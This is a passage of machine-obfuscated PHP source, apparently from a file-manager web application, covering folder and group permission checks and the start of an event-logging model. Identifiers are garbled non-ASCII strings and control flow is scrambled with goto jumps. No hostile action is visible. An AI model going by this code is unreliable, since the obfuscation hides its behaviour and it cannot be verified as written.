$DãªŒıôæŒ[$böÂ˜ªÁ¿œ[$A˜∏îëªŒ´[397]]] = $böÂ˜ªÁ¿œ[$A˜∏îëªŒ´[498]]; } } $E•Ÿê»”ê– = array_values(array_unique($E•Ÿê»”ê–)); goto bŒ˘âÍÈì≈; fßº‹òÃﬂï: if (isset($e‚øÉÌÔ†ú[$cçÛöØ•‚à])) { return $e‚øÉÌÔ†ú[$cçÛöØ•‚à]; } $fÑòñ·™÷â = Model($A˜∏îëªŒ´[1915])->listData(); $e«è”Ÿ«¶¥ = array(); goto D—§¯æÚÁÌ; e∏ûñ‘î“ù: } private function makeSourceAuth($cˆ”äﬁàµ¬, $D„∆ﬁöÊÑ˜, $E¨Œî«ÉÇ† = false) { goto Fö≈ö—ï¢⁄; Aîá˘ú¥´î: if (!$eâ≤É∂©µø) { $aﬁó∆÷√Ô– = Model($Aÿ∂≤„—¨ã[516])->getInfo($Dòôõáü¿¡); $eæÈó™€ìã = explode($Aÿ∂≤„—¨ã[47], trim($aﬁó∆÷√Ô–[$Aÿ∂≤„—¨ã[515]], $Aÿ∂≤„—¨ã[47])); $eæÈó™€ìã = array_reverse($eæÈó™€ìã); foreach ($eæÈó™€ìã as $aûà©é¿∞¢) { if ($aûà©é¿∞¢ == $Aÿ∂≤„—¨ã[191] || $aûà©é¿∞¢ == $A£™öá˘è‚) { continue; } $Dÿß∆√êÌ‹ = $this->groupRootAuth($aûà©é¿∞¢, $E¨Œî«ÉÇ†); if (!$Dÿß∆√êÌ‹) { continue; } $eâ≤É∂©µø = $this->groupAuthInfo($Dÿß∆√êÌ‹, $aûà©é¿∞¢); break; } } if (!$eâ≤É∂©µø || $eâ≤É∂©µø[$Aÿ∂≤„—¨ã[409]] <= 0) { $cÓíﬁÜƒùí = $this->authDeepCheck($cˆ”äﬁàµ¬[$Aÿ∂≤„—¨ã[397]], $E¨Œî«ÉÇ†); if ($cÓíﬁÜƒùí) { $eâ≤É∂©µø = $cÓíﬁÜƒùí; } } return $eâ≤É∂©µø; goto fãÈÔ Á≈Ô; aÏﬁØ‚∞çÜ: foreach ($EÉ‡Ωóñ¢¡ as $F¡≥°¢äø´) { if (!isset($D„∆ﬁöÊÑ˜[$F¡≥°¢äø´])) { continue; } $bﬂçâ∑í⁄† = $this->authMake($D„∆ﬁöÊÑ˜[$F¡≥°¢äø´], $E¨Œî«ÉÇ†); if ($bﬂçâ∑í⁄†[$Aÿ∂≤„—¨ã[460]]) { $eâ≤É∂©µø = $bﬂçâ∑í⁄†; break; } } if (!$dîâåú∏äÉ) { return $eâ≤É∂©µø; } if (!$eâ≤É∂©µø && $dÕ·Ωı∆£‹) { $eâ≤É∂©µø = $this->groupAuthInfo($dÕ·Ωı∆£‹, $Dòôõáü¿¡); } goto Aîá˘ú¥´î; BÁ˜⁄è„Õ©: $dîâåú∏äÉ = $cˆ”äﬁàµ¬[$Aÿ∂≤„—¨ã[406]] == SourceModel::TYPE_GROUP; $dÕ·Ωı∆£‹ = $dîâåú∏äÉ ? $this->groupRootAuth($Dòôõáü¿¡, $E¨Œî«ÉÇ†) : !1; if ($dÕ·Ωı∆£‹ && Model($Aÿ∂≤„—¨ã[501])->authCheckAction($dÕ·Ωı∆£‹[$Aÿ∂≤„—¨ã[408]], $Aÿ∂≤„—¨ã[1746])) { return $this->groupAuthInfo($dÕ·Ωı∆£‹, $Dòôõáü¿¡); } goto eÎ∂ü„¬ú·; Fö≈ö—ï¢⁄: $Aÿ∂≤„—¨ã =& $_SERVER[’ÿƒ†ïò]; $A£™öá˘è‚ = $Aÿ∂≤„—¨ã[87]; $Dòôõáü¿¡ = $cˆ”äﬁàµ¬[$Aÿ∂≤„—¨ã[498]]; goto BÁ˜⁄è„Õ©; eÎ∂ü„¬ú·: $EÉ‡Ωóñ¢¡ = Model($Aÿ∂≤„—¨ã[1234])->parentLevelArray($cˆ”äﬁàµ¬[$Aÿ∂≤„—¨ã[515]]); $EÉ‡Ωóñ¢¡ = array_merge(array($cˆ”äﬁàµ¬[$Aÿ∂≤„—¨ã[397]]), array_reverse($EÉ‡Ωóñ¢¡)); $eâ≤É∂©µø = !1; goto aÏﬁØ‚∞çÜ; fãÈÔ Á≈Ô: } private function userIsRoot($a¢ŒˆÜç∫  = false) { $AïÊ≥€…Úñ =& $_SERVER[’ÿƒ†ïò]; if (!$a¢ŒˆÜç∫  && _get($GLOBALS, $AïÊ≥€…Úñ[499])) { return !0; } $bøë˜°Áëø = Model($AïÊ≥€…Úñ[532])->getInfo($a¢ŒˆÜç∫ ); $eàÆñÕ ‘ò = Model($AïÊ≥€…Úñ[1917])->listData($bøë˜°Áëø[$AïÊ≥€…Úñ[1440]]); if ($eàÆñÕ ‘ò && $eàÆñÕ ‘ò[$AïÊ≥€…Úñ[505]][$AïÊ≥€…Úñ[1918]] == 1) { return !0; } return !1; } private function sourceAuthInfo($E€éíã–è‘) { goto eﬁø™ùô“Ω; eﬁø™ùô“Ω: $aÈπı…˘ñ¯ =& $_SERVER[’ÿƒ†ïò]; $cîÛé¡•ÑÁ = Model($aÈπı…˘ñ¯[1234]); $Bñ˘Íﬂ»ä = $cîÛé¡•ÑÁ->sourceInfo($E€éíã–è‘); goto B ∆⁄∞ª ∏; B ∆⁄∞ª ∏: if (!$Bñ˘Íﬂ»ä) { return !1; } $cîÛé¡•ÑÁ->groupPathDisplay($Bñ˘Íﬂ»ä); $C∂çﬂÈÕ¿Ñ = array($Bñ˘Íﬂ»ä); goto dÌêÓ¨≈ôÓ; CìÚ∏⁄€Îï: if (isset($Bñ˘Íﬂ»ä[$aÈπı…˘ñ¯[521]])) { $b»äñãô∂” = explode($aÈπı…˘ñ¯[8], trim($Bñ˘Íﬂ»ä[$aÈπı…˘ñ¯[513]], $aÈπı…˘ñ¯[8])); array_shift($b»äñãô∂”); $Aã◊É«Ô¬’ = $Bñ˘Íﬂ»ä[$aÈπı…˘ñ¯[519]] . $aÈπı…˘ñ¯[1919] . implode($aÈπı…˘ñ¯[8], $b»äñãô∂”); } return array($aÈπı…˘ñ¯[415] => $Bñ˘Íﬂ»ä[$aÈπı…˘ñ¯[28]], $aÈπı…˘ñ¯[76] => KodIO::make($Bñ˘Íﬂ»ä[$aÈπı…˘ñ¯[397]]), $aÈπı…˘ñ¯[1920] => $Aã◊É«Ô¬’); goto BÉç∫º˘ñ˘; dÌêÓ¨≈ôÓ: $C∂çﬂÈÕ¿Ñ = $cîÛé¡•ÑÁ->_listAppendPath($C∂çﬂÈÕ¿Ñ); $Bñ˘Íﬂ»ä = $C∂çﬂÈÕ¿Ñ[0]; $Aã◊É«Ô¬’ = $Bñ˘Íﬂ»ä[$aÈπı…˘ñ¯[513]]; goto CìÚ∏⁄€Îï; BÉç∫º˘ñ˘: } private function groupAuthInfo($c≈æâàÆ…ë, $DÙ∂Ö·Çﬁ‘) { $føáÉïå†π =& $_SERVER[’ÿƒ†ïò]; $AÇõΩÜíƒï = Model($føáÉïå†π[516])->getInfo($DÙ∂Ö·Çﬁ‘); return array($føáÉïå†π[1921] => intval($c≈æâàÆ…ë[$føáÉïå†π[408]]), $føáÉïå†π[1905] => $c≈æâàÆ…ë, $føáÉïå†π[1922] => LNG($føáÉïå†π[1923]), $føáÉïå†π[1914] => array($føáÉïå†π[415] => $AÇõΩÜíƒï[$føáÉïå†π[28]], $føáÉïå†π[76] => KodIO::make($AÇõΩÜíƒï[$føáÉïå†π[85]][$føáÉïå†π[397]]), $føáÉïå†π[1920] => $AÇõΩÜíƒï[$føáÉïå†π[520]])); } protected function groupRootAuth($cﬁﬁ◊è†íø, $aËâŸãåÉ˘ = false) { goto A¨Ïë¡ÇúÌ; A¨Ïë¡ÇúÌ: $F—·â‰úõ¯ =& $_SERVER[’ÿƒ†ïò]; $aËâŸãåÉ˘ = $aËâŸãåÉ˘ ? $aËâŸãåÉ˘ : USER_ID; $e Õ¯“ìõ∆ = $aËâŸãåÉ˘ . $F—·â‰úõ¯[1924] . $cﬁﬁ◊è†íø; goto Bó…ˆ€‡à; fÏ∂—…îá„: $Cáª•”±÷˜ = $this->userGroupList($aËâŸãåÉ˘); $aìåÁ Ò¯ø = isset($Cáª•”±÷˜[$cﬁﬁ◊è†íø]) ? $Cáª•”±÷˜[$cﬁﬁ◊è†íø][$F—·â‰úõ¯[408]] : !1; if ($aìåÁ Ò¯ø && Model($F—·â‰úõ¯[501])->authCheckAction($aìåÁ Ò¯ø[$F—·â‰úõ¯[408]], $F—·â‰úõ¯[1746])) { $C¢ìÌ¶É¯Ë[$e Õ¯“ìõ∆] = $aìåÁ Ò¯ø; return $aìåÁ Ò¯ø; } goto d◊õÉìõî◊; cÔ»øŒ»ÎØ: $C¢ìÌ¶É¯Ë[$e Õ¯“ìõ∆] = $D¥πÒΩµÖå ? $D¥πÒΩµÖå : $aìåÁ Ò¯ø; return $C¢ìÌ¶É¯Ë[$e Õ¯“ìõ∆]; goto bÌÌ™çâ…·; Bó…ˆ€‡à: static $C¢ìÌ¶É¯Ë = array(); if (isset($C¢ìÌ¶É¯Ë[$e Õ¯“ìõ∆])) { return $C¢ìÌ¶É¯Ë[$e Õ¯“ìõ∆]; } $AÙä§Íá·Ù = Model($F—·â‰úõ¯[516])->getInfo($cﬁﬁ◊è†íø); goto fÏ∂—…îá„; d◊õÉìõî◊: $a∞ÇÎûΩ⁄¿ = $this->sourceAuthSelect($AÙä§Íá·Ù[$F—·â‰úõ¯[85]][$F—·â‰úõ¯[397]]); $eÌ÷›’Ôå∞ = $a∞ÇÎûΩ⁄¿ ? $this->authMake($a∞ÇÎûΩ⁄¿, $aËâŸãåÉ˘) : !1; $D¥πÒΩµÖå = $eÌ÷›’Ôå∞ ? $eÌ÷›’Ôå∞[$F—·â‰úõ¯[460]] : !1; goto cÔ»øŒ»ÎØ; bÌÌ™çâ…·: } public function authOwnerApply($FÿÀÂ”§Ô∆) { goto eÊ™ÓÌÉÜÑ; C‰Ï±©ÔıÚ: $C‡±ëµ„ìã = array(); $d≈≈Æ‘Èâï = array(); foreach ($f∂¶ëÁæÚã as $C∂ÜØ’ ÓÜ => $CË™ˆ£û€‰) { $Fõ≤ñ›–ä = $this->authFolderOwnerUser($CË™ˆ£û€‰); $C‡±ëµ„ìã[$C∂ÜØ’ ÓÜ] = $Fõ≤ñ›–ä; $d≈≈Æ‘Èâï = array_merge($d≈≈Æ‘Èâï, $Fõ≤ñ›–ä[$fÎ…‡≠ã¨¨[588]]); if ($Fõ≤ñ›–ä[$fÎ…‡≠ã¨¨[1926]]) { break; } } goto cêÕ∂ô·Ñø; cêÕ∂ô·Ñø: if (count($d≈≈Æ‘Èâï) == 0) { $d≈≈Æ‘Èâï = $this->authFolderOwnerGroup($FÿÀÂ”§Ô∆[$fÎ…‡≠ã¨¨[498]]); } $d≈≈Æ‘Èâï = array_unique($d≈≈Æ‘Èâï); if (AuthModel::authCheckRoot($FÿÀÂ”§Ô∆[$fÎ…‡≠ã¨¨[408]][$fÎ…‡≠ã¨¨[409]])) { $d≈≈Æ‘Èâï[] = USER_ID; } goto a≤¥¬ç¨íª; eÊ™ÓÌÉÜÑ: $fÎ…‡≠ã¨¨ =& $_SERVER[’ÿƒ†ïò]; if (empty($FÿÀÂ”§Ô∆[$fÎ…‡≠ã¨¨[408]]) || isset($FÿÀÂ”§Ô∆[$fÎ…‡≠ã¨¨[1925]]) && $FÿÀÂ”§Ô∆[$fÎ…‡≠ã¨¨[1925]]) { return $FÿÀÂ”§Ô∆; } if (AuthModel::authCheckRoot($FÿÀÂ”§Ô∆[$fÎ…‡≠ã¨¨[408]][$fÎ…‡≠ã¨¨[409]])) { return $FÿÀÂ”§Ô∆; } goto bÛ»Ìıπ“¨; bÛ»Ìıπ“¨: $añÖÖ⁄ÖÎµ = Model($fÎ…‡≠ã¨¨[1234])->parentLevelArray($FÿÀÂ”§Ô∆[$fÎ…‡≠ã¨¨[515]]); $añÖÖ⁄ÖÎµ = array_merge(array($FÿÀÂ”§Ô∆[$fÎ…‡≠ã¨¨[397]]), array_reverse($añÖÖ⁄ÖÎµ)); $f∂¶ëÁæÚã = $this->sourceAuthSelect($añÖÖ⁄ÖÎµ); goto C‰Ï±©ÔıÚ; a≤¥¬ç¨íª: $FÿÀÂ”§Ô∆[$fÎ…‡≠ã¨¨[408]][$fÎ…‡≠ã¨¨[1927]] = Model($fÎ…‡≠ã¨¨[507])->userListInfo($d≈≈Æ‘Èâï); return $FÿÀÂ”§Ô∆; goto cÓ´£ä£úÌ; cÓ´£ä£úÌ: } private function authFolderOwnerGroup($a§¯¶«±ëÓ) { $AµÑâ˘‘€Ô =& $_SERVER[’ÿƒ†ïò]; $BâñÒü‚πÊ = Model($AµÑâ˘‘€Ô[1812])->where(array($AµÑâ˘‘€Ô[1726] => $a§¯¶«±ëÓ))->select(); $F‚∂◊˜¯Ï‚ = array(); if (!$BâñÒü‚πÊ) { return $F‚∂◊˜¯Ï‚; } foreach ($BâñÒü‚πÊ as $FıÈÑì±‚Ñ) { $C‡ÜäŒÜıØ = $this->authInfo($FıÈÑì±‚Ñ); if (AuthModel::authCheckRoot($C‡ÜäŒÜıØ[$AµÑâ˘‘€Ô[408]])) { $F‚∂◊˜¯Ï‚[] = $FıÈÑì±‚Ñ[$AµÑâ˘‘€Ô[1557]]; } } return $F‚∂◊˜¯Ï‚; } private function authFolderOwnerUser($b∂†‡“êåﬂ) { $E∂©÷÷ñÎÀ =& $_SERVER[’ÿƒ†ïò]; $FÌÜñë‘∆€ = array(); $B··ãÃ‘ˆá = !1; foreach ($b∂†‡“êåﬂ as $C“îè∫ó÷à) { $a∂â  ßäÃ = $this->authInfo($C“îè∫ó÷à); if ($C“îè∫ó÷à[$E∂©÷÷ñÎÀ[498]] == $E∂©÷÷ñÎÀ[191]) { $B··ãÃ‘ˆá = !0; } if ($C“îè∫ó÷à[$E∂©÷÷ñÎÀ[406]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($a∂â  ßäÃ[$E∂©÷÷ñÎÀ[408]])) { $FÌÜñë‘∆€[] = $C“îè∫ó÷à[$E∂©÷÷ñÎÀ[498]]; } } } return array($E∂©÷÷ñÎÀ[588] => $FÌÜñë‘∆€, $E∂©÷÷ñÎÀ[1926] => $B··ãÃ‘ˆá); } public function authMake($C‘⁄¿±˜Ñµ, $E∏âä∑©ÃŸ = false) { $D¡Ï’µÒ∂⁄ =& $_SERVER[’ÿƒ†ïò]; $AÊ√–“ˆ”  = $this->authArrayCheck($C‘⁄¿±˜Ñµ, $E∏âä∑©ÃŸ); if ($AÊ√–“ˆ” [$D¡Ï’µÒ∂⁄[1928]]) { $AÊ√–“ˆ” [$D¡Ï’µÒ∂⁄[1928]] = $this->sourceAuthInfo($AÊ√–“ˆ” [$D¡Ï’µÒ∂⁄[1928]]); } return $AÊ√–“ˆ” ; } public function authArrayCheck($d›ô⁄øéíá, $e‰õ™™÷ñ∑ = false) { goto bÖÒÌ…è∆◊; eÂáÆ◊ì¨¶: return $dØáØ£“±ˆ; goto e…Øå√ﬁ«‰; D“’°òŒ¬´: $a√’⁄Õ“Ó“ = 0; $E√úéÕΩ∏Ï = 0; $a˜Ø·£´„π = 0; goto bΩà—êì∏Õ; Fè˘ªàÍÑ…: $eﬂé±©ú¥Â = 1000; $b†·ŒŒ…∫û = 0; $B˜ßﬂŒ°ıê = 0; goto cœÔúﬂ‰öè; bÖÒÌ…è∆◊: $fÆ€È»õáÈ =& $_SERVER[’ÿƒ†ïò]; if (!$d›ô⁄øéíá) { return array($fÆ€È»õáÈ[409] => 0, $fÆ€È»õáÈ[460] => !1); } $e‰õ™™÷ñ∑ = $e‰õ™™÷ñ∑ ? $e‰õ™™÷ñ∑ : USER_ID; goto D“’°òŒ¬´; bΩà—êì∏Õ: $F√ÒÈ◊ŒÍÒ = 0; $F„ùì©æÛﬁ = 0; $eÍó√£⁄ıâ = 0; goto Fè˘ªàÍÑ…; cœÔúﬂ‰öè: $FØÆ¯òäŒÂ = 0; $bñ‹Ï£¯Ñˆ = 0; $fÖãë≤†˘¶ = array($fÆ€È»õáÈ[397] => 0); goto e√ßﬁèŸ≤◊; e√ßﬁèŸ≤◊: foreach ($d›ô⁄øéíá as $fÖãë≤†˘¶) { $cäÉ‚›õù† = $this->authInfo($fÖãë≤†˘¶); if (!$cäÉ‚›õù†) { continue; } $b÷â‰ø≤àœ = $fÖãë≤†˘¶[$fÆ€È»õáÈ[498]]; $BΩç∆ÎõÏë = intval($cäÉ‚›õù†[$fÆ€È»õáÈ[408]]); if ($fÖãë≤†˘¶[$fÆ€È»õáÈ[406]] == SourceModel::TYPE_USER && $b÷â‰ø≤àœ == $e‰õ™™÷ñ∑) { $a√’⁄Õ“Ó“ = !0; $a˜Ø·£´„π = $cäÉ‚›õù†; $E√úéÕΩ∏Ï = $BΩç∆ÎõÏë; } else { if ($fÖãë≤†˘¶[$fÆ€È»õáÈ[406]] == SourceModel::TYPE_GROUP && $this->groupContainUser($b÷â‰ø≤àœ, $e‰õ™™÷ñ∑)) { $F√ÒÈ◊ŒÍÒ = !0; $D§ÌàãáÂë = $this->groupStepToUserGroup($b÷â‰ø≤àœ, $e‰õ™™÷ñ∑); if ($D§ÌàãáÂë < $eﬂé±©ú¥Â) { $eﬂé±©ú¥Â = $D§ÌàãáÂë; $F„ùì©æÛﬁ = $BΩç∆ÎõÏë; $eÍó√£⁄ıâ = $cäÉ‚›õù†; $b†·ŒŒ…∫û = $b÷â‰ø≤àœ; } if ($D§ÌàãáÂë == $eﬂé±©ú¥Â && $BΩç∆ÎõÏë >= $F„ùì©æÛﬁ) { $F„ùì©æÛﬁ = $BΩç∆ÎõÏë; $eÍó√£⁄ıâ = $cäÉ‚›õù†; $b†·ŒŒ…∫û = $b÷â‰ø≤àœ; } } else { if ($b÷â‰ø≤àœ == $fÆ€È»õáÈ[191]) { $B˜ßﬂŒ°ıê = !0; $bñ‹Ï£¯Ñˆ = $cäÉ‚›õù†; $FØÆ¯òäŒÂ = $BΩç∆ÎõÏë; } } } } if ($a√’⁄Õ“Ó“) { $aàﬁƒåèƒ… = $E√úéÕΩ∏Ï; $cäÉ‚›õù† = $a˜Ø·£´„π; $C∫’æƒﬂã¬ = LNG($fÆ€È»õáÈ[1929]); } else { if ($F√ÒÈ◊ŒÍÒ) { $aàﬁƒåèƒ… = $F„ùì©æÛﬁ; $cäÉ‚›õù† = $eÍó√£⁄ıâ; $fÈæΩ¡∆ê° = Model($fÆ€È»õáÈ[516])->getInfo($b†·ŒŒ…∫û); $C∫’æƒﬂã¬ = $fÆ€È»õáÈ[160] . $fÈæΩ¡∆ê°[$fÆ€È»õáÈ[520]] . $fÆ€È»õáÈ[1930] . LNG($fÆ€È»õáÈ[1931]); } else { if ($B˜ßﬂŒ°ıê) { $aàﬁƒåèƒ… = $FØÆ¯òäŒÂ; $cäÉ‚›õù† = $bñ‹Ï£¯Ñˆ; $C∫’æƒﬂã¬ = LNG($fÆ€È»õáÈ[1902]); } else { $aàﬁƒåèƒ… = 0; $cäÉ‚›õù† = !1; $C∫’æƒﬂã¬ = $fÆ€È»õáÈ[33]; } } } $dØáØ£“±ˆ = array($fÆ€È»õáÈ[1921] => intval($aàﬁƒåèƒ…), $fÆ€È»õáÈ[1905] => $cäÉ‚›õù†, $fÆ€È»õáÈ[1922] => $C∫’æƒﬂã¬, $fÆ€È»õáÈ[1914] => $fÖãë≤†˘¶[$fÆ€È»õáÈ[397]]); goto eÂáÆ◊ì¨¶; e…Øå√ﬁ«‰: } private function groupContainUser($f»—‘†ì√Ã, $d˘ÜâƒıÚˆ = false) { return in_array($f»—‘†ì√Ã, $this->userGroupParents($d˘ÜâƒıÚˆ)); } private function groupStepToUserGroup($AÚÉ‡é´æõ, $d≈øÇÇµã… = false) { goto bıˆﬁŸæ≈∆; Eâ£Üèäî: $CΩ…√îºÚÏ = $GLOBALS[$CˆÆÆ√Ìœ¿[6]][$CˆÆÆ√Ìœ¿[88]][$CˆÆÆ√Ìœ¿[1823]] == 1; $Aƒ≈¬∫åò∞ = $CΩ…√îºÚÏ ? 3 : 2; foreach ($dÛæà›åÉ‚ as $FêÁ•ﬁ›Ëˆ) { if ($FêÁ•ﬁ›Ëˆ[$CˆÆÆ√Ìœ¿[1726]] == $AÚÉ‡é´æõ) { return 0; } $bÙ¨Ô±êÜı = explode($CˆÆÆ√Ìœ¿[47], trim($FêÁ•ﬁ›Ëˆ[$CˆÆÆ√Ìœ¿[515]], $CˆÆÆ√Ìœ¿[47])); if ($bÙ¨Ô±êÜı[0] == $CˆÆÆ√Ìœ¿[191] && count($bÙ¨Ô±êÜı) > $Aƒ≈¬∫åò∞) { $fß§âÊãéÈ = array_reverse(array_slice($bÙ¨Ô±êÜı, $Aƒ≈¬∫åò∞)); $Dí®äπ±äü = array_search($AÚÉ‡é´æõ, $fß§âÊãéÈ); if ($Dí®äπ±äü !== !1 && $Dí®äπ±äü + 1 <= $b‰«ÌÁ¶ù™) { $b‰«ÌÁ¶ù™ = $Dí®äπ±äü + 1; } } } goto e€åâÆßÓË; bıˆﬁŸæ≈∆: $CˆÆÆ√Ìœ¿ =& $_SERVER[’ÿƒ†ïò]; $dÛæà›åÉ‚ = $this->userGroupList($d≈øÇÇµã…); $b‰«ÌÁ¶ù™ = 1000; goto Eâ£Üèäî; e€åâÆßÓË: return $b‰«ÌÁ¶ù™; goto aëΩ∂ÿ®©´; aëΩ∂ÿ®©´: } private function userGroupList($F≥∑‰©†œâ = false) { $dÿ‰úöâÆÑ =& $_SERVER[’ÿƒ†ïò]; static $dûÜéËµ“∆ = array(); if (isset($dûÜéËµ“∆[$F≥∑‰©†œâ])) { return $dûÜéËµ“∆[$F≥∑‰©†œâ]; } $Fè≥º’Í◊Œ = Model($dÿ‰úöâÆÑ[532])->getInfo($F≥∑‰©†œâ); $dûÜéËµ“∆[$F≥∑‰©†œâ] = array_to_keyvalue($Fè≥º’Í◊Œ[$dÿ‰úöâÆÑ[1903]], $dÿ‰úöâÆÑ[1726]); return $dûÜéËµ“∆[$F≥∑‰©†œâ]; } public function userGroupParents($E◊≠ØúÔ“Â) { goto a’¡ﬂÂª•ë; CÖËÙ√⁄ò‡: $cÖÕº≈–Êß[$E◊≠ØúÔ“Â] = array_unique($d¥‚Ùì®¢ ); return $cÖÕº≈–Êß[$E◊≠ØúÔ“Â]; goto F±ª∞Ô‰⁄è; cÏÉ∂±õ√¿: if (isset($cÖÕº≈–Êß[$E◊≠ØúÔ“Â])) { return $cÖÕº≈–Êß[$E◊≠ØúÔ“Â]; } $DØúæµÖ≠Ú = $this->userGroupList($E◊≠ØúÔ“Â); $d¥‚Ùì®¢  = array(); goto eë∞Øáœ·∂; eë∞Øáœ·∂: $FÎæÍÛÿ∫¯ = $GLOBALS[$c´Ô“∑èÎ’[6]][$c´Ô“∑èÎ’[88]][$c´Ô“∑èÎ’[1823]] == 1; $B·òáÇåÌ÷ = $FÎæÍÛÿ∫¯ ? 3 : 2; foreach ($DØúæµÖ≠Ú as $AΩÖìπÓß) { $AÙ¢‰Ë≤åñ = array($AΩÖìπÓß[$c´Ô“∑èÎ’[1726]]); $Aµáåµ∑Ñı = explode($c´Ô“∑èÎ’[47], trim($AΩÖìπÓß[$c´Ô“∑èÎ’[515]], $c´Ô“∑èÎ’[47])); if ($Aµáåµ∑Ñı[0] == $c´Ô“∑èÎ’[191] && count($Aµáåµ∑Ñı) > $B·òáÇåÌ÷) { $e∫ìäÑ ¯— = array_slice($Aµáåµ∑Ñı, $B·òáÇåÌ÷); $AÙ¢‰Ë≤åñ = array_merge($AÙ¢‰Ë≤åñ, array_reverse($e∫ìäÑ ¯—)); } $d¥‚Ùì®¢  = array_merge($d¥‚Ùì®¢ , $AÙ¢‰Ë≤åñ); } goto CÖËÙ√⁄ò‡; a’¡ﬂÂª•ë: $c´Ô“∑èÎ’ =& $_SERVER[’ÿƒ†ïò]; static $cÖÕº≈–Êß = array(); $E◊≠ØúÔ“Â = $E◊≠ØúÔ“Â ? $E◊≠ØúÔ“Â : USER_ID; goto cÏÉ∂±õ√¿; F±ª∞Ô‰⁄è: } public function authTargetInfoMake($B™ãÂÍ€Ú) { goto D¶£ñ…ÉÙø; D¶£ñ…ÉÙø: $Aêí∫’Î≤ﬂ =& $_SERVER[’ÿƒ†ïò]; $aƒáÖ”Òøä = array(); $C€–Ω‚©≈Ò = array(); goto aÎÁÏœÿÚÑ; D≠˘◊çµê∑: return array($Aêí∫’Î≤ﬂ[1933] => $aƒáÖ”Òøä, $Aêí∫’Î≤ﬂ[1934] => $C€–Ω‚©≈Ò); goto d∑çëü£±π; aÎÁÏœÿÚÑ: foreach ($B™ãÂÍ€Ú as $E⁄ÉÇÒÉ«∑) { if ($E⁄ÉÇÒÉ«∑[$Aêí∫’Î≤ﬂ[406]] == SourceModel::TYPE_USER) { $aƒáÖ”Òøä[] = intval($E⁄ÉÇÒÉ«∑[$Aêí∫’Î≤ﬂ[498]]); } else { if ($E⁄ÉÇÒÉ«∑[$Aêí∫’Î≤ﬂ[406]] == SourceModel::TYPE_GROUP) { $C€–Ω‚©≈Ò[] = intval($E⁄ÉÇÒÉ«∑[$Aêí∫’Î≤ﬂ[498]]); } } } if ($aƒáÖ”Òøä) { $aƒáÖ”Òøä = Model($Aêí∫’Î≤ﬂ[507])->userListInfo($aƒáÖ”Òøä); } if ($C€–Ω‚©≈Ò) { $AÖ≈‹°¥¯û = array($Aêí∫’Î≤ﬂ[1810] => array($Aêí∫’Î≤ﬂ[413], $C€–Ω‚©≈Ò)); $C€–Ω‚©≈Ò = Model($Aêí∫’Î≤ﬂ[516])->field($Aêí∫’Î≤ﬂ[1932])->where($AÖ≈‹°¥¯û)->select(); $C€–Ω‚©≈Ò = array_to_keyvalue($C€–Ω‚©≈Ò, $Aêí∫’Î≤ﬂ[1726]); } goto D≠˘◊çµê∑; d∑çëü£±π: } public function authInfo($aÇÑáÖ◊û◊) { $Fÿìéê¯‚È =& $_SERVER[’ÿƒ†ïò]; if ($aÇÑáÖ◊û◊[$Fÿìéê¯‚È[1826]]) { $fõŸ’Ê‹‰Ü = Model($Fÿìéê¯‚È[501])->listData($aÇÑáÖ◊û◊[$Fÿìéê¯‚È[1826]]); if (!$fõŸ’Ê‹‰Ü) { return !1; $a¥≠ù∏∆ºÙ = Model($Fÿìéê¯‚È[501])->listData(); $F˜ÂÌ¢Èﬁ≠ = array_filter_by_field($a¥≠ù∏∆ºÙ, $Fÿìéê¯‚È[408], $Fÿìéê¯‚È[191]); return $F˜ÂÌ¢Èﬁ≠; } $c¶≠◊ÎŒ≈’ = array_field_key($fõŸ’Ê‹‰Ü, array($Fÿìéê¯‚È[395], $Fÿìéê¯‚È[28], $Fÿìéê¯‚È[408], $Fÿìéê¯‚È[1748], $Fÿìéê¯‚È[1749])); $c¶≠◊ÎŒ≈’[$Fÿìéê¯‚È[1935]] = $aÇÑáÖ◊û◊; return $c¶≠◊ÎŒ≈’; } else { return array($Fÿìéê¯‚È[414] => 0, $Fÿìéê¯‚È[1732] => $aÇÑáÖ◊û◊[$Fÿìéê¯‚È[1880]], $Fÿìéê¯‚È[415] => $Fÿìéê¯‚È[33], $Fÿìéê¯‚È[1748] => $Fÿìéê¯‚È[1936]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\162\143\x65\137\x65\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\151\155\x65", "\x74\151\x6d\x65", "\x69\x6e\x73\145\162\x74", "\146\165\156\x63\x74\x69\157\x6e"), array("\144\145\163\x63", '', "\x69\x6e\163\x65\162\164\54\165\x70\x64\141\x74\145\54\163\145\x6c\145\x63\164", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Fàç•Ì¬´—, $D∂∆É¯üµ‚, $BçÖﬁ¢‚Ú… = '') { goto dâ∞ÿ”¨≤Î; dâ∞ÿ”¨≤Î: $b¯´ôå◊Ù© =& $_SERVER[’ÿƒ†ïò]; if (!$this->eventSave) { return; } $BÈÿÑæ≥ö˜ = Model($b¯´ôå◊Ù©[1234])->sourceInfo($Fàç•Ì¬´—); goto D∂ÖªÆﬂ¯ì; D∂ÖªÆﬂ¯ì: if (!$BÈÿÑæ≥ö˜) { return !1; } if ($this->isCacheEvent($BÈÿÑæ≥ö˜, $D∂∆É¯üµ‚)) { return; } if ($BçÖﬁ¢‚Ú… && is_string($BçÖﬁ¢‚Ú…)) { $BçÖﬁ¢‚Ú… = array($b¯´ôå◊Ù©[1764] => $BçÖﬁ¢‚Ú…); } goto Fÿìﬂ∑–§; BÊŒ˜ùıöÓ: return $this->add($féºπáôè°); goto DÑ€È∑éÇÏ; Fÿìﬂ∑–§: $féºπáôè° = array($b¯´ôå◊Ù©[412] => $Fàç•Ì¬´—, $b¯´ôå◊Ù©[1937] => $BÈÿÑæ≥ö˜[$b¯´ôå◊Ù©[492]], $b¯´ôå◊Ù©[1938] => $BÈÿÑæ≥ö˜[$b¯´ôå◊Ù©[28]], $b¯´ôå◊Ù©[513] => !empty($BÈÿÑæ≥ö˜[$b¯´ôå◊Ù©[513]]) ? $BÈÿÑæ≥ö˜[$b¯´ôå◊Ù©[513]] : $b¯´ôå◊Ù©[33], $b¯´ôå◊Ù©[1548] => USER_ID, $b¯´ôå◊Ù©[417] => $D∂∆É¯üµ‚, $b¯´ôå◊Ù©[1550] => $BçÖﬁ¢‚Ú…); $this->addSystemLog($D∂∆É¯üµ‚, $féºπáôè°); unset($féºπáôè°[$b¯´ôå◊Ù©[1938]], $féºπáôè°[$b¯´ôå◊Ù©[513]]); goto 